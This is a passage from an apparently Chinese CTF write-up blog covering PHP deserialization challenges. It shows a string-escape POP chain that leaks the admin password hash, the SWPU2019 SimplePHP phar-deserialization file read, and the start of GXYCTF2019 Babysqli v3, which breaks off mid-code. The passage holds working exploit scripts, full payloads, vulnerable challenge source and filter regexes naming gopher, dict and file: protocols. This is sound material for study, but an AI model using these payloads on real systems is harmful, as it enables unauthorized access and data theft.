<p>这时我们看到了Info类内有<code>__call()</code>魔术方法，如果调用了一个不存在的属性，<code>__call()</code>方法就会触发，正好Info类没有update()方法，那么如果User内的<code>$nickname</code>实例化为Info对象，调用不存在update()就会触发这个<code>__call()</code>，这个<code>__call()</code>魔术方法将Ctrlcase的login()函数结果输出出来。</p>
<p>这样我们只需要<code>$CtrlCase</code>变量实例化为dbCtrl类的对象，这句话相当于相当于<code>dbCtrl::login($sql)</code>，而且可知<code>dbCtrl::login($sql)</code>中的<code>$sql</code>参数，实际上是User类中的$age变量传入的，参数就是我们控制的了。</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">public</span> $nickname = <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;age = <span class="string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $sql;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> $password = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> UpdateHelper;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br></pre></td></tr></table></figure>
<p>序列化的结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>构造好了POP链，接下来就是要找到触发反序列化的点。</p>
<p>从update.php 可以跟进User类的update()函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续跟进<code>getNewInfo()</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的返回值是一个先序列化在经过safe()函数处理的Info类对象。</p>
<p>所以最终能够反序列化的不是我们直接传入的字符串，而是用我们的值实例化一个Info类的对象，然后对这个对象进行实例化，再对这个序列化结果进行safe()处理，最后得到的值再进行反序列化。</p>
<p>所以想要发序列化我们的payload，就得控制 Info类对象的序列化串，看一下这个序列化串的格式</p>
<p>（假设age=20；nickname=lethe）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:5:&quot;lethe&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>这里的原理有点类似注入，都是闭合，先看一下我们构造的payload如下，未逃逸字符串前:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到我们在已序列化串前面加上了<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>，在最后加上了一个<code>&#125;</code>（整个长度为263），这样我们将其作为<code>new Info($age,$nickname)</code>的nickname传入时，序列化的结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:263:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>但是长度为263的payload还是当作了一个普通字符串，而不是序列化里的内容。</p>
<p>这时候就需要用到字符逃逸的原理了，我们在payload的前面加上263个<code>union</code>，在经过safe函数之后，<code>union</code>全部被替换成<code>hacker</code>，也就是相当于新增了263个字符，这样就导致跟在后面的长度为263个字符的payload成功逃逸。</p>
<p>而之所前面构造的时候在最后面加一个<code>&#125;</code>，是因为Info类的对象只有3个变量，<code>&#125;</code>前面已经有3个变量满足了序列化串的要求了，所以加一个<code>&#125;</code>来闭合整个序列化串。</p>
<p>最终payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>在update.php内post提交<code>age=123&amp;nickname=</code>后面接上输出结果，就会得到admin密码的md5。</p>
<h2 id="SWPU2019-SimplePHP">SWPU2019 SimplePHP</h2>
<h3 id="考点-v12">考点</h3>
<ul>
<li>文件包含</li>
<li>Phar反序列化</li>
</ul>
<h3 id="解题-v12">解题</h3>
<p>查看文件页面有文件包含，可以读取源码：</p>
<p>file.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>] ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>function.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    $temp = explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>class.php中有一个很明显的POP链，此外，由于没有unserialize函数触发反序列化，那么就只能上传一个phar来触发反序列化。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c1e4r = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$c1e4r-&gt;str = $show;</span><br><span class="line">$show-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $test;</span><br><span class="line">$test-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line">$phar-&gt;setMetadata($c1e4r); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>生成exp.phar后改后缀为gif，然后查看上传的文件名</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816000059.png" alt=""></p>
<p>最后使用phar协议读取该文件。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816000157.png" alt=""></p>
<p>解码得到flag。</p>
<h2 id="GXYCTF2019-Babysqli-v3">GXYCTF2019 Babysqli v3</h2>
<h3 id="考点-v13">考点</h3>
<ul>
<li>弱口令</li>
<li>PHP反序列化</li>
</ul>
<h3 id="解题-v13">解题</h3>
<p>弱口令爆破。。。。。得到admin/password。</p>
<p>PHP伪协议读取源码<code>php://filter/read=convert.base64-encode/resource=home.php</code></p>
<p>home.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/upload$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">				$file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				$file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;当前引用的是 &quot;</span>.$file;</span><br><span class="line">			<span class="keyword">require</span> $file;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">	上传文件</span><br><span class="line">	&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5($_SESSION[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">		$ext = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span 